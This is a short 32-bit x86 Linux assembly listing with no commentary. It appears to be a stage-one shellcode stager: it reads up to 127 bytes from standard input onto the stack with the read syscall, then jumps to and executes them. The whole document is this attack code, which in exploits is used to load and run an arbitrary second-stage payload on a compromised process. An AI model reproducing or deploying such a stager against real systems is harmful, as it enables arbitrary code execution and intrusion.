global _start

section .text
  _start:
    lea   ecx, [esp]
    xor   eax, eax
    cdq
    mov   ebx, edx
    mov   eax, ebx
    mov   al, 0x3
    mov   dl, 0x7f
    int   0x80
    call  ecx
